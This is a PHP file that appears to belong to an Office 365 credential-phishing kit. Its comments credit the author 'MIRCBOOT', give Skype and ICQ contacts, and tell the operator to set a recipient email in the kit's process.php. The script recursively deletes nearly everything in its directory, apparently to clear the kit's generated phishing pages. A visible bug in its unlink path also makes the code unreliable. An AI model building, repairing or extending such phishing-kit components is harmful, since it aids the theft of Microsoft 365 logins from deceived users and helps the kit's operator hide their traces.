<?php
// DONT CHANGE ANYTHING HERE JUST CHANGE YOUR EMAIL FROM folder ( look >> validator >> process.php >> $recipient
// THIS SCRIPT CODED BY MIRCBOOT
// CONTACT US SKYPE : MIRCBOOT
// ICQ : 703514486
// OFFICE 365 Version 0.4
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!! Attention !!!!!!!!!!!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
	$files = glob(getcwd().'/*'); // get all file names
	foreach($files as $file){ // iterate files
	  	if(is_dir($file)) {
			if($file==getcwd().'/BoxOffice') {
				// do nothing
			}
			else {
				rrmdir($file);
			}
		}
		else if(is_file($file)) {
			if($file==getcwd().'/index.php' || $file==getcwd().'/boot.php' || $file==getcwd().'/robots.txt' || $file==getcwd().'/delete.php' || $file==getcwd().'/error_log.txt') {
				// do nothing
			}
			else {
				print $file;
	    			unlink(getcwd().'/'.$file); // delete file
			}
		}
	}
	function rrmdir($dir) { 
		if (is_dir($dir)) { 
			$objects = scandir($dir); 
			foreach ($objects as $object) { 
				if ($object != "." && $object != "..") { 
					if (is_dir($dir."/".$object))
						rrmdir($dir."/".$object);
					else
						unlink($dir."/".$object); 
				} 
			}
			rmdir($dir); 
		} 
	}
	print 'All generated folders and files has been deleted';
?>
